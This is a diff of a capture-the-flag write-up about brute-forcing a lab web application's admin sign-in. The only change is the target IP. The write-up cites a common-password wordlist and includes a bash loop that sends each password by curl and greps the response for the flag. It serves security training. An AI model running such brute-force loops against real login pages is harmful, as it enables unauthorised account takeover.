@@ -1,7 +1,7 @@
 #06_BrutForce
 
 ##Research explanation
-- On the sign-in webpage, we have a username and password field visible - http://192.168.156.114/index.php?page=signin
+- On the sign-in webpage, we have a username and password field visible - http://192.168.56.101/index.php?page=signin
 - A common breach with user credentials is to try the brut force method, which will load several username and password combinations to find one of the valid ones.
 - To do it, we will download a list of the most common passwords usually used. NB: a new list is usually edited every year.
 - In our case, we chose this one: https://github.com/tarraschk/richelieu le french_password_top1000.txt.
@@ -12,7 +12,7 @@
 #!/bin/bash
 for i in $(cat dictionnaire)
 	do
-		curl -X POST "http://192.168.156.114/index.php?page=signin&username=admin&password=$i&Login=Login#" | grep 'flag'>>result.txt
+		curl -X POST "http://192.168.56.101/index.php?page=signin&username=admin&password=$i&Login=Login#" | grep 'flag'>>result.txt
 if grep 'flag' ./result.txt
 then
   echo "Password: $i">>result.txt
